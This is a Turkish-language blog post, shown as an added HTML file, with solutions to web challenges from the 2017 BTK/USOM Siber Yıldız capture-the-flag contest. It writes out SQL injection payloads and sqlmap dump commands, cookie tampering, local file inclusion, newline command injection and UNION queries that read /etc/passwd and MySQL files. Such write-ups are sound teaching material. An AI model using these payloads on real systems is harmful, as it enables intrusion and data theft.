@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="tr">
+<title>BTK (USOM) Siber Yıldız Yarışması Çözümleri | Mustafa ALTINKAYNAK | Siber Güvenlik</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Siber Yıldız Yarışması nedir? Türkiye’de var olan Siber Güvenlik Uzmanlarının keşfedileceği, onları cesaretlendirip, onore edici ödüllerin de verileceği ülke...">
+<meta name="author" content="Mustafa ALTINKAYNAK">
+<meta name="generator" content="Jekyll v4.0.0">
+<link rel="canonical" href="http://localhost:4000/siberyildiz-cozumleri/">
+
+<link rel="stylesheet" href="/assets/css/index.css">
+
+<link rel="stylesheet" href="/assets/css/classes.css">
+<link rel="stylesheet" href="/assets/css/sidebar.css" media="screen and (min-width: 70em)">
+<link rel="alternate" href="/feed.xml" type="application/atom+xml" title="Mustafa ALTINKAYNAK | Siber Güvenlik">
+
+
+
+
+<header class="icons">
+    <img src="/assets/images/mustafa-altinkaynak-profil.jpg" style="border-radius:50%;" alt="Mustafa Altınkaynak " class="landing-profile-pic">
+  
+  
+    
+  <nav>
+  <a aria-label="Anasayfa" href="/" ><svg aria-hidden="true" ><use xlink:href="/assets/fontawesome/icons.svg#home"></use></svg><span aria-hidden="true" class="hidden">Anasayfa</span></a>
+  <a aria-label="Hakkımda" href="/pages/about.html" ><svg aria-hidden="true" ><use xlink:href="/assets/fontawesome/icons.svg#address-card"></use></svg><span aria-hidden="true" class="hidden">Hakkımda</span></a>
+  <a aria-label="İletişim" href="/pages/contact.html" ><svg aria-hidden="true" ><use xlink:href="/assets/fontawesome/icons.svg#envelope"></use></svg><span aria-hidden="true" class="hidden">İletişim</span></a>
+  
+  </nav>
+
+
+    
+  <nav>
+  <a aria-label="Instagram" target="_blank" href="https://www.instagram.com/mustafaaltinkaynakcom" ><svg aria-hidden="true" ><use xlink:href="/assets/fontawesome/icons.svg#instagram"></use></svg><span aria-hidden="true" class="hidden">Instagram</span></a>
+  <a aria-label="Twitter" target="_blank" href="https://www.twitter.com/m_altinkaynak" ><svg aria-hidden="true" ><use xlink:href="/assets/fontawesome/icons.svg#twitter"></use></svg><span aria-hidden="true" class="hidden">Twitter</span></a>
+  <a aria-label="Github" target="_blank" href="https://www.github.com/mustafaaltinkaynak" ><svg aria-hidden="true" ><use xlink:href="/assets/fontawesome/icons.svg#github"></use></svg><span aria-hidden="true" class="hidden">Github</span></a>
+  <a aria-label="LinkedIn" target="_blank" href="https://www.linkedin.com/in/altinkaynak" ><svg aria-hidden="true" ><use xlink:href="/assets/fontawesome/icons.svg#linkedin"></use></svg><span aria-hidden="true" class="hidden">LinkedIn</span></a>
+  
+  </nav>
+
+
+  
+  
+    <div class="hidden description"></div>
+  
+</header>
+
+<article>
+  <header>
+  
+  <h1><a href="/siberyildiz-cozumleri/">BTK (USOM) Siber Yıldız Yarışması Çözümleri</a></h1><time datetime="2017-01-23T00:00:00+03:00">January 23, 2017</time>
+</header>
+
+  <h2 id="siber-yıldız-yarışması-nedir">Siber Yıldız Yarışması nedir?</h2>
+
+<p><img src="/assets/images/siberyildiz/siber.jpeg" alt="" /></p>
+
+<p>Türkiye’de var olan Siber Güvenlik Uzmanlarının keşfedileceği, onları cesaretlendirip, onore edici ödüllerin de verileceği ülkemizin 2017 yılı Siber Yıldızlarının belirleneceği Siber Güvenlik Yarışmasıdır.</p>
+
+<p>Yarışmayı <strong>KırmızıBeyaz</strong> ekibi olarak başarıyla tamamladık. Takım arkadaşlarım <strong>Hakan ERYAVUZ</strong>, <strong>Besim ALTINOK</strong> ve <strong>Meryem AKDOĞAN</strong>‘ı kutluyorum. Resmi açıklamayı bekliyoruz. Bu sürede sizlerle çözümlediğimiz soruları paylaşmak istedik. Besim Altınok’un <a href="https://github.com/besimaltnok/siberyildiz">github hesabından</a> diğer sorulara ulaşabilirsiniz. Sorular yazıldıkça içerik güncellenecektir.</p>
+
+<h2 id="2-bakalım-ne-kadar-iyisin">2. Bakalım ne kadar iyisin?</h2>
+
+<p><img src="/assets/images/siberyildiz/soru2/1.png" alt="" />
+Bu soru basit bir SQL injection sorusuydu. Başta temel SQL injection ile ilerledik. Kullanıcı adı kısmına sayfanın altında yer alan ibareden hareketle <strong>Yonetici</strong>, parola kısmına ise <strong>‘1 ‘or’=’1</strong> şeklinde yazdığımızda sayfa çıktısında “<strong>giriş yaptın</strong>” şeklinde ibare aldık. Artık bariz SQL injection olduğu ortada idi.</p>
+
+<p><img src="/assets/images/siberyildiz/soru2/2.png" alt="" /></p>
+
+<p>Hedef uygulama üzerinde boolean ve time based olmak üzere iki farklı SQL injection zafiyeti tespit ettik. Bağlantımızın yavaş olması nedeniyle time based üzerinden sonuç alamayabilirdik. Bu yüzden boolean SQL injection tekniğiyle ilerledik. Sqlmap aracıyla yeni tanışanlar için basit şekilde anlatmak istiyorum.</p>
+
+<p>Aşağıdaki komut ile birlikte <strong>parola</strong> parametresini hedef alarak <strong>dbs</strong> parametresi sayesinde veritabanı listesini getirdik.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  sqlmap.py -u "http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95/index.php" --data="kullaniciadi=Yonetici&amp;parola=" -p parola --risk=3  --level=5 --dbms=mysql --dbs
+</code></pre></div></div>
+
+<p>Bu komutta ise bir önceki komut ile elde ettiğimiz <strong>web2</strong> adındaki veritabanında yer alan tüm tabloları getirdik.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  sqlmap.py -u "http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95/index.php" --data="kullaniciadi=Yonetici&amp;parola=" -p parola --risk=3 --level=5 --dbms=mysql -D web2 --tables
+</code></pre></div></div>
+
+<p>Aşağıdaki komut ile birlikte bir önceki komutlar ile elde ettiğimiz “web2” ve “kullanıcılar” tablosunun dökümünü(<strong>–dump</strong>) aldık.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  sqlmap.py -u "http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95/index.php" --data="kullaniciadi=Yonetici&amp;parola=" -p parola --risk=3 --level=5 --dbms=mysql --dbs --random-agent -D web2 -T kullanicilar --dump
+</code></pre></div></div>
+
+<p>İlgili flag kullanıcılar tablosunda yer almaktaydı ve flag boolean tekniğiyle karşımıza geldi.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  FLAG: f4aa0edc033b9dfcc676c33420996789
+</code></pre></div></div>
+
+<h2 id="3-yetkili-bir-kullanıcı-ile-giriş-yapman-lazım">3. Yetkili bir kullanıcı ile giriş yapman lazım.</h2>
+
+<p>Bu sayfada ise bizi websitesi karşılıyor.</p>
+
+<p><img src="/assets/images/siberyildiz/soru3/1.png" alt="" /></p>
+
+<p>Sayfa içerisinde gezinirken bir yandan da headerı kontrol ediyordum. Header içerisinde isAdmin=cfcd208495d565ef66e7dff9f98764da şeklinde tanımlanmış bir cookie bilgisine ulaştık. <strong>cfcd208495d565ef66e7dff9f98764da</strong> md5 değerini çözünce 0 olarak gördük. Yani <strong>isAdmin=md5(1)</strong> yapmamız durumunda hak yükseltebilirdik. <strong>isAdmin=c4ca4238a0b923820dcc509a6f75849b</strong> şeklinde isteklerimizi gönderdiğimizde bilgiler.php dosyasında flage ulaştık.</p>
+
+<h2 id="4-şimdi-de-uygulamanın-kullandığı-veritabanı-parolası-lazım">4. Şimdi de uygulamanın kullandığı veritabanı parolası lazım.</h2>
+
+<p>Bu soruya giriş yaptığımızda “404 NOT Found” hata sayfası ile karşılaşılıyordu. Sayfanın kaynağını incelediğimiz de CSS ile gizlenmiş şekilde bir form yer alıyordu.</p>
+
+<p><img src="/assets/images/siberyildiz/soru4/sanayihirsizligi-2.png" alt="" /></p>
+
+<p>Görünür hale getirdikten sonra “<strong>admin</strong>”,”<strong>admin</strong>” ikisiyle içeri girdik.</p>
+
+<p>Bilet Satış Platformunda başlığında bir sayfaya yönlendirildik. Bu sayfada “<strong>index.php?file=firmalar.php</strong>”, “<strong>index.php?file=sitekullanimi.php</strong>” gibi URL bilgilerini görünce LFI olduğunu doğrudan anladık.</p>
+
+<p><strong>index.php?file=firmalar.php</strong> sayfası üzerinde almış olduğumuz <strong>/home/sites/siberyildiz/files/inc/pages/firmalar.php syntax error on line 11</strong> hatası ise dizini tespit etmemize yardımcı oldu. Bulunduğumuz dizinin pages dizini olduğunu gördük.</p>
+
+<p><img src="/assets/images/siberyildiz/soru4/soru4-2.jpg" alt="" /></p>
+
+<p>Genellikle web geliştirici veritabanı bağlantı bilgilerini “includes”,”inc”,”db” gibi klasörler altında “<strong>ayar.php</strong>”,”<strong>ayarlar.php</strong>”,”<strong>connect.php</strong>”,”<strong>conn.php</strong>”,”<strong>db.php</strong>” gibi dosya isimlerinde tutmaktadır. Bu teoriden yola çıkarak bir üst dizine çıkmamızı ve db.php dosyasını içeri çağıran URL ile birlikte <strong>index.php?file=../db.php</strong> kolayca flagi elde ettik.</p>
+
+<p><img src="/assets/images/siberyildiz/soru4/sanayihirsizligi-3.png" alt="" /></p>
+
+<p>Kahraman Şehidimiz <strong>Ömer Halis DEMİR</strong>‘e Allah’dan rahmet diliyoruz.</p>
+
+<h2 id="11-bu-görev-önünde-iki-seçenek-var--başarılı-olursun-veya-olamazsın">11. Bu görev önünde iki seçenek var : başarılı olursun veya olamazsın?</h2>
+
+<p>Bu soruya giriş yapıldığında “nothing here” şeklinde bir ibare karşılıyordu. Ne olabilir diye düşünürken robots.txt dosyasını görüntüledik. İçerisinde yer alan Disallow: cannotfindme bilgisi üzerine cannotfindme dizinine geçtik. Burada ufak bir giriş alanı gördük.</p>
+
+<p><img src="/assets/images/siberyildiz/soru11/1.png" alt="" /></p>
+
+<p>Kullanıcı adı “admin” olarak giriş yaptığımızda, yeni bir alan ve form açıldı.</p>
+
+<p><img src="/assets/images/siberyildiz/soru11/2.png" alt="" /></p>
+
+<p>Giriş yaptığımız yerde bizden komut çalıştırılması isteniyordu. http://www.hedef.com/?pass=sifre&amp;cmd=ls şeklinde oluşan link üzerinde pass değişkenini brute force uygulamak CTF mantığımıza aykırı gelmişti.</p>
+
+<p>Kısa süre sonra array injection ile birlikte ?pass[]=&amp;cmd=ls olarak dosyaları listelemeyi başardık. İlgili dizinde <strong>“index.php”</strong>,<strong>“readme.txt”</strong> ve <strong>“try.html”</strong> dosyalarının olduğunu gördüm. <strong>try.html</strong> dosyası içerisinde <strong>read file /tmp/isThatFlag.txt</strong> ifadesi yer alıyor fakat sistem <strong>ls</strong> harici komut çalıştırmamıza izin vermiyordu.</p>
+
+<p>Bunun üzerine /tmp altındaki <strong>isThatFlag.txt</strong> dosyasını okumak için new line yani bir alt satıra geç ifadesinin encode değeri olan <strong>%0a</strong> ifadesini kullandık. <strong>http://hedef.com/cannotfindme/?pass[]=&amp;cmd=ls%0acat%20/tmp/isThatFlag.txt</strong> ile birlikte flagi elde ettik.</p>
+
+<h2 id="12-yapabileceğine-inancımız-tam">12. Yapabileceğine inancımız tam.?</h2>
+
+<p><img src="/assets/images/siberyildiz/soru12/1.jpg" alt="" /></p>
+
+<p>Bu soruda ise resimden göreceğiniz üzere iki adet bağlantı yer almaktadır. Ek olarak index.php?id=1 bağlantısı üzerinden dosya indirebileceğimiz söylenmektedir. Bağlantıya tıkladığımızda “a.jpg” isimli boş bir dosyanın indirildiğini görüyoruz.</p>
+
+<p>Muhtemelen aşağıdaki şekilde bir SQL sorgusu arka planda işlemektedir.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select * from files where id=1
+</code></pre></div></div>
+
+<p>Biz bunu şu şekilde yaparsak dosya indirebiliriz.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select * from files where id=-1' UNION 1,'/etc/passwd' %23
+</code></pre></div></div>
+
+<p>Bir UNION SQL injection kuralı gereği ilk sorguda kaç kolon dönüyorsa, ikinci sorguda aynı sayıda kolonun dönmesi gerekmektedir. Bu yüzden UNION’dan sonra 1 ifadesini yalnızca kolon olması adına ekledik.</p>
+
+<p><img src="/assets/images/siberyildiz/soru12/2.jpg" alt="" /></p>
+
+<p>Biraz uğraşın ardında diğer sayfalarda yer alan SQL bağlantı hataları izlenimindeki ifadeler üzerinden “users” veritabanına girebilmek adına yedeklerine ulaşmak için /var/lib/mysql/ altından ilgili veritabanı ve tablo bilgilerini indirdik. /var/lib/mysql dizini altında veritabanları, kolonlar ve içerikleri yer almaktadır.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select * from files where id=-1' UNION 1,'/var/lib/mysql/users/login.MYD' %23
+</code></pre></div></div>
+
+<p>Elde ettiğimiz login.MYD dosyasını string ile okuduğumuzda giriş bilgilerini elde ettik.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mustafaaltinkaynak:mustafaaltinkaynak$ strings login.MYD
+admin
+bu1Parolami?Sence?
+</code></pre></div></div>
+
+<p>Elde ettiğimiz bu bilgiyi ikinci bağlantıda yer alan ?username=DENEME&amp;password=deneme ile giriş yapabilirsiniz ibaresinin yer aldığı kısıma GET isteği şeklinde gönderdiğimizde flagi elde ettik.</p>
+
+<p><img src="/assets/images/siberyildiz/soru12/4.jpg" alt="" /></p>
+
+  
+</article>
+
+
+  <footer class="related">
+    <div class="previous"><span>Previous Post</span><a href="/ufw-kurulumu-ve-yapilandirma/">UFW Kurulumu ve Yapılandırma</a></div>
+    <div class="next"><span>Next Post</span><a href="/siber-guvenlik-ve-hacking-kitabi/">Siber Güvenlik ve Hacking Kitabı</a></div>
+  </footer>
+
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-101755558-3"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-101755558-3');
+</script>
+</html>
